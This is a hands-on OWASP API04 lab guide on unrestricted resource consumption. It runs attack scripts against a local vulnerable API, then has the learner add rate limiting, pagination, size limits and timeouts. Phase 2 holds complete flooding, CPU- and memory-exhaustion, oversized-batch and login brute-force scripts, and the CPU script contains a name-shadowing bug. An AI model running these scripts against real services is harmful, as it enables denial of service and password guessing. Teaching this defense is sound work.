# API04 Rate Limiting Lab - Instructions

## Overview

This lab teaches you about **API04: Unrestricted Resource Consumption** through hands-on exploitation and remediation. You'll attack a vulnerable API, then implement proper defenses.

## Setup

### 1. Start the Lab

```bash
cd OWASP-API/API04-Unrestricted-Resource-Consumption/lab/api04-rate-limiting-lab/
docker-compose up -d
```

Wait for the container to start and seed the database (about 30 seconds).

### 2. Verify It's Running

```bash
curl http://localhost:5004/health
```

Should return: `{"status":"healthy","message":"API is running"}`

### 3. Open Web Interface

Visit http://localhost:5004/ in your browser to see the API documentation and test endpoints interactively.

## Phase 1: Reconnaissance (10 minutes)

### Exercise 1.1: Explore the API

**Objective:** Understand the API's structure and identify expensive endpoints.

1. Check database stats:
```bash
curl http://localhost:5004/api/stats
```

2. Test a small request:
```bash
curl "http://localhost:5004/api/search?q=Product"
```

3. Identify vulnerabilities by reading `server.py`

**Questions to answer:**
- How many users are in the database?
- Which endpoints return the most data?
- Which operations are CPU intensive?

### Exercise 1.2: Measure Response Times

Create a script to measure endpoint response times:

```bash
#!/bin/bash
endpoints=(
    "/api/users"
    "/api/orders"
    "/api/search?q=test"
)

for endpoint in "${endpoints[@]}"; do
    echo "Testing: $endpoint"
    time curl -s "http://localhost:5004$endpoint" > /dev/null
    echo "---"
done
```

**Expected findings:**
- `/api/users` should return 10,000+ records
- `/api/orders` should return 50,000+ records
- Both should take several seconds

## Phase 2: Exploitation (30 minutes)

### Exercise 2.1: Request Flooding

**Objective:** Overwhelm the API with volume.

Create `flood_attack.py`:

```python
import requests
import concurrent.futures
import time

API_URL = "http://localhost:5004"

def send_request(i):
    """Send a single request"""
    try:
        start = time.time()
        response = requests.get(f"{API_URL}/api/users")
        duration = time.time() - start
        
        return {
            'request_num': i,
            'status': response.status_code,
            'duration': duration,
            'size': len(response.content)
        }
    except Exception as e:
        return {'request_num': i, 'error': str(e)}

def flood_test(concurrent_requests=10, total_requests=100):
    """Flood the API with requests"""
    print(f"Flooding API with {total_requests} requests ({concurrent_requests} concurrent)...")
    
    start_time = time.time()
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=concurrent_requests) as executor:
        futures = [executor.submit(send_request, i) for i in range(total_requests)]
        results = [f.result() for f in concurrent.futures.as_completed(futures)]
    
    duration = time.time() - start_time
    
    # Analyze results
    successful = [r for r in results if 'error' not in r]
    errors = [r for r in results if 'error' in r]
    
    print(f"\nResults:")
    print(f"  Total time: {duration:.2f}s")
    print(f"  Successful: {len(successful)}")
    print(f"  Errors: {len(errors)}")
    print(f"  Requests/sec: {total_requests/duration:.2f}")
    
    if successful:
        avg_duration = sum(r['duration'] for r in successful) / len(successful)
        avg_size = sum(r['size'] for r in successful) / len(successful)
        print(f"  Avg response time: {avg_duration:.2f}s")
        print(f"  Avg response size: {avg_size/1024:.2f} KB")

if __name__ == '__main__':
    # Start with low volume
    print("Phase 1: Low volume (10 concurrent)")
    flood_test(concurrent_requests=10, total_requests=50)
    
    print("\n" + "="*60 + "\n")
    
    # Increase to medium volume
    print("Phase 2: Medium volume (50 concurrent)")
    flood_test(concurrent_requests=50, total_requests=200)
    
    print("\n" + "="*60 + "\n")
    
    # High volume attack
    print("Phase 3: High volume (100 concurrent)")
    flood_test(concurrent_requests=100, total_requests=500)
```

Run it:
```bash
python3 flood_attack.py
```

**Expected outcome:** API becomes slow or unresponsive.

### Exercise 2.2: CPU Exhaustion

**Objective:** Exhaust CPU with expensive operations.

Create `cpu_attack.py`:

```python
import requests
import concurrent.futures
import time

API_URL = "http://localhost:5004"

def generate_report():
    """Trigger expensive report generation"""
    try:
        start = time.time()
        response = requests.post(
            f"{API_URL}/api/generate-report",
            json={}
        )
        duration = time.time() - start
        
        return {
            'duration': duration,
            'status': response.status_code
        }
    except Exception as e:
        return {'error': str(e)}

def cpu_attack(concurrent=5):
    """Exhaust CPU with report generation"""
    print(f"Launching {concurrent} concurrent report generations...")
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=concurrent) as executor:
        futures = [executor.submit(generate_report) for _ in range(concurrent)]
        results = [f.result() for f in concurrent.futures.as_completed(futures)]
    
    for i, result in enumerate(results):
        if 'error' not in result:
            print(f"  Report {i+1}: {result['duration']:.2f}s")
        else:
            print(f"  Report {i+1}: ERROR - {result['error']}")

if __name__ == '__main__':
    cpu_attack(concurrent=10)
```

**Expected outcome:** Server CPU usage spikes to 100%.

### Exercise 2.3: Memory Exhaustion

**Objective:** Fill server memory with large responses.

Create `memory_attack.py`:

```python
import requests
import concurrent.futures

API_URL = "http://localhost:5004"

def fetch_large_dataset(endpoint):
    """Fetch endpoints that return massive datasets"""
    try:
        print(f"Fetching {endpoint}...")
        response = requests.get(f"{API_URL}{endpoint}")
        size_mb = len(response.content) / (1024 * 1024)
        print(f"  Received {size_mb:.2f} MB")
        
        # Keep data in memory
        return response.json()
    except Exception as e:
        print(f"  Error: {e}")
        return None

def memory_attack():
    """Exhaust memory by requesting large datasets concurrently"""
    endpoints = [
        '/api/users',
        '/api/orders',
        '/api/users',
        '/api/orders',
        '/api/users',
        '/api/orders',
    ]
    
    print(f"Requesting {len(endpoints)} large datasets concurrently...")
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=len(endpoints)) as executor:
        futures = [executor.submit(fetch_large_dataset, ep) for ep in endpoints]
        results = [f.result() for f in concurrent.futures.as_completed(futures)]
    
    # Keep all data in memory
    total_records = sum(len(r['data']) if r and 'data' in r else 0 for r in results)
    print(f"\nTotal records in memory: {total_records:,}")

if __name__ == '__main__':
    memory_attack()
```

**Expected outcome:** Server memory usage increases significantly.

### Exercise 2.4: Batch Operation Abuse

**Objective:** Exploit unbounded batch processing.

```bash
curl -X POST http://localhost:5004/api/batch/process \
  -H "Content-Type: application/json" \
  -d "{\"items\": $(python3 -c 'import json; print(json.dumps([{"data": f"item-{i}"} for i in range(10000)]))')}"
```

Or with Python:

```python
import requests

API_URL = "http://localhost:5004"

# Create massive batch
items = [{"data": f"item-{i}"} for i in range(100000)]

print(f"Sending batch with {len(items)} items...")
response = requests.post(
    f"{API_URL}/api/batch/process",
    json={"items": items}
)

print(f"Status: {response.status_code}")
if response.status_code == 200:
    data = response.json()
    print(f"Processed: {data['count']} items")
```

**Expected outcome:** Server hangs or crashes processing large batch.

### Exercise 2.5: Login Brute Force

**Objective:** Demonstrate lack of rate limiting on authentication.

```python
import requests
import time

API_URL = "http://localhost:5004"

def brute_force_login(email, password_attempts=100):
    """Brute force login endpoint"""
    print(f"Attempting {password_attempts} login attempts...")
    
    start_time = time.time()
    successful = 0
    
    for i in range(password_attempts):
        response = requests.post(
            f"{API_URL}/api/login",
            json={
                "email": email,
                "password": f"password{i}"
            }
        )
        
        if response.status_code == 200:
            successful += 1
            print(f"  Attempt {i}: SUCCESS!")
        
        if i % 10 == 0:
            print(f"  Completed {i} attempts...")
    
    duration = time.time() - start_time
    
    print(f"\nResults:")
    print(f"  Total attempts: {password_attempts}")
    print(f"  Successful: {successful}")
    print(f"  Time taken: {duration:.2f}s")
    print(f"  Rate: {password_attempts/duration:.2f} attempts/sec")

if __name__ == '__main__':
    brute_force_login("user1@example.com", password_attempts=50)
```

**Expected outcome:** All 50 attempts complete without any blocking.

## Phase 3: Understanding Impact (15 minutes)

### Exercise 3.1: Monitor Resource Usage

While running attacks, monitor Docker container resources:

```bash
# Watch resource usage
docker stats api04-vulnerable-api

# Or use htop if installed
docker exec -it api04-vulnerable-api htop
```

### Exercise 3.2: Calculate Attack Economics

Answer these questions:

1. **Attacker cost:**
   - Cost to run attack script: $0 (free compute)
   - Time investment: 5 minutes to write script
   - Total cost: ~$0

2. **Victim cost:**
   - Server crashes: Lost revenue
   - Increased cloud bills: Scaling costs
   - Developer time: Hours debugging
   - Reputation damage: Priceless
   - Total cost: $$$$$

3. **Attack/Defense ratio:**
   - 1 attacker vs. entire engineering team
   - $0 attack cost vs. thousands in damage
   - 5 minutes to attack vs. days to recover

## Phase 4: Implement Defenses (45 minutes)

Now fix the vulnerabilities!

### Exercise 4.1: Add Rate Limiting

Install Flask-Limiter:

```bash
# Add to requirements.txt
echo "Flask-Limiter==3.5.0" >> app/requirements.txt

# Rebuild container
docker-compose down
docker-compose build
docker-compose up -d
```

Modify `server.py`:

```python
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

# Add after app = Flask(__name__)
limiter = Limiter(
    app=app,
    key_func=get_remote_address,
    storage_uri="memory://",  # Use Redis in production
    default_limits=["100 per hour"]
)

# Apply to specific endpoints
@app.route('/api/users')
@limiter.limit("10 per minute")
def get_users():
    # existing code...

@app.route('/api/login', methods=['POST'])
@limiter.limit("5 per minute")
def login():
    # existing code...
```

### Exercise 4.2: Add Pagination

Update `/api/users` endpoint:

```python
@app.route('/api/users')
@limiter.limit("60 per minute")
def get_users():
    # Get pagination parameters
    page = request.args.get('page', 1, type=int)
    per_page = min(request.args.get('per_page', 50, type=int), 100)
    
    if page < 1 or per_page < 1:
        return jsonify({'error': 'Invalid pagination parameters'}), 400
    
    # Calculate offset
    offset = (page - 1) * per_page
    
    db = get_db()
    cursor = db.cursor()
    
    # Get paginated results
    cursor.execute(
        'SELECT id, email, name, created_at FROM users LIMIT ? OFFSET ?',
        (per_page, offset)
    )
    users = cursor.fetchall()
    
    # Get total count
    cursor.execute('SELECT COUNT(*) FROM users')
    total = cursor.fetchone()[0]
    
    db.close()
    
    users_list = [dict(user) for user in users]
    
    return jsonify({
        'data': users_list,
        'pagination': {
            'page': page,
            'per_page': per_page,
            'total': total,
            'total_pages': (total + per_page - 1) // per_page
        }
    })
```

### Exercise 4.3: Add Request Size Limits

Add to `server.py`:

```python
# After app = Flask(__name__)
app.config['MAX_CONTENT_LENGTH'] = 10 * 1024 * 1024  # 10 MB limit

# Add error handler
@app.errorhandler(413)
def request_too_large(error):
    return jsonify({'error': 'Request too large (max 10MB)'}), 413
```

### Exercise 4.4: Add Batch Size Limits

Update `/api/batch/process`:

```python
@app.route('/api/batch/process', methods=['POST'])
@limiter.limit("10 per minute")
def batch_process():
    data = request.get_json()
    
    if not data or 'items' not in data:
        return jsonify({'error': 'Items array required'}), 400
    
    items = data['items']
    
    # ADD THIS: Limit batch size
    MAX_BATCH_SIZE = 100
    if len(items) > MAX_BATCH_SIZE:
        return jsonify({
            'error': f'Batch size exceeds maximum of {MAX_BATCH_SIZE}'
        }), 400
    
    # existing processing code...
```

### Exercise 4.5: Add Timeout Protection

For expensive operations, add timeouts:

```python
import signal
from contextlib import contextmanager

@contextmanager
def timeout(seconds):
    def timeout_handler(signum, frame):
        raise TimeoutError(f"Operation timed out after {seconds}s")
    
    old_handler = signal.signal(signal.SIGALRM, timeout_handler)
    signal.alarm(seconds)
    
    try:
        yield
    finally:
        signal.alarm(0)
        signal.signal(signal.SIGALRM, old_handler)

@app.route('/api/generate-report', methods=['POST'])
@limiter.limit("2 per minute")
def generate_report():
    try:
        with timeout(10):  # 10 second timeout
            # existing report generation code...
    except TimeoutError:
        return jsonify({'error': 'Report generation timeout'}), 408
```

## Phase 5: Testing Your Defenses (15 minutes)

### Exercise 5.1: Verify Rate Limiting Works

```bash
# Should succeed for first 5 requests
for i in {1..10}; do
  echo "Request $i:"
  curl -X POST http://localhost:5004/api/login \
    -H "Content-Type: application/json" \
    -d '{"email":"test@example.com","password":"test"}'
  echo ""
done

# Requests 6-10 should return 429 (rate limited)
```

### Exercise 5.2: Verify Pagination Works

```bash
# Request first page
curl "http://localhost:5004/api/users?page=1&per_page=10"

# Should return only 10 users, not 10,000
```

### Exercise 5.3: Verify Batch Limits Work

```python
import requests

# This should fail (exceeds limit)
large_batch = [{"data": f"item-{i}"} for i in range(1000)]
response = requests.post(
    "http://localhost:5004/api/batch/process",
    json={"items": large_batch}
)
print(f"Large batch: {response.status_code} - {response.json()}")

# This should succeed
small_batch = [{"data": f"item-{i}"} for i in range(50)]
response = requests.post(
    "http://localhost:5004/api/batch/process",
    json={"items": small_batch}
)
print(f"Small batch: {response.status_code} - {response.json()}")
```

### Exercise 5.4: Re-run Attack Scripts

Re-run your attack scripts from Phase 2. They should now fail or be throttled.

## Phase 6: Advanced Challenges (Optional, 30 minutes)

### Challenge 1: Implement Redis-Backed Rate Limiting

For production use, rate limiting needs to work across multiple servers.

1. Add Redis to `docker-compose.yml`
2. Update Flask-Limiter to use Redis storage
3. Test that limits are enforced across instances

### Challenge 2: Implement Cost-Based Rate Limiting

Different endpoints have different costs:

```python
ENDPOINT_COSTS = {
    '/api/health': 1,
    '/api/users': 10,
    '/api/generate-report': 50
}

# Use costs in rate limiting logic
```

### Challenge 3: Add Monitoring

Implement Prometheus metrics to track:
- Request counts per endpoint
- Rate limit hits
- Response times
- Error rates

## Success Criteria

You've completed the lab when:

- ✅ Attack scripts that crashed the vulnerable API now fail gracefully
- ✅ Rate limiting blocks excessive requests with 429 responses
- ✅ Pagination limits response sizes
- ✅ Batch operations reject oversized inputs
- ✅ Legitimate usage still works correctly
- ✅ You understand the economics and impact of resource exhaustion

## Cleanup

```bash
# Stop and remove containers
docker-compose down

# Remove volumes (database)
docker-compose down -v
```

## Next Steps

1. Review [prevention.md](../../prevention.md) for advanced techniques
2. Study [examples.md](../../examples.md) for production patterns
3. Apply these learnings to your own APIs

## Additional Resources

- [OWASP API Security Top 10](https://owasp.org/www-project-api-security/)
- [Flask-Limiter Documentation](https://flask-limiter.readthedocs.io/)
- [Rate Limiting Algorithms Explained](https://en.wikipedia.org/wiki/Rate_limiting)

---

**Remember:** These vulnerabilities are common in real APIs. Always implement resource controls before deploying to production!
